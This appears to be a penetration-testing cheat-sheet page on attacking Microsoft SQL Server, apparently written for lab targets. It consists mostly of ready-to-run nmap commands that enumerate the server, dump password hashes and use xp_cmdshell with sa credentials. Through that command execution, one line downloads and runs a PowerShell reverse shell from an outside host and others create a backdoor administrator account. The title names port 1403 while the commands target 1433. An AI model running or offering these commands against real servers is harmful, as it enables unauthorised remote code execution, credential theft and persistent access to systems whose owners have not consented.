# Port 1403 - MSSQL

Please check [MSSQL](https://app.gitbook.com/o/sbYQpaBkV0ueQjvLIdTt/s/nA4bAkddGXesk1QCLYAY/~/changes/192/database-attacks/mssql) section in Database Attacks.

#### Reconnaissance

{% code overflow="wrap" %}
```bash
# Check the detail of nmap mssql reconnasance
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.10.10.143
```
{% endcode %}

#### Command Execution

{% code overflow="wrap" %}
```bash
# Just in case when you see some RCE result from the recon above
sudo nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse 10.10.10.143 -p1433 --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="whoami"

# Reverse sehll 
sudo nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse 10.10.10.143 -p1433 --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="powershell -c iex(new-object net.webclient).downloadstring('http://192.168.142.141/shell.ps1')"

# Ping
sudo nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse 10.11.1.31 -p1433 --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="ping 192.168.119.128"

# Create a backdoor user
sudo nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse 10.11.1.31 -p 1433 --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="net user iptracej iptracej123 /add"

# Remote Desktop user
sudo nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse 10.11.1.31 -p 1433 --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="net localgroup administrators iptracej /add"
```
{% endcode %}

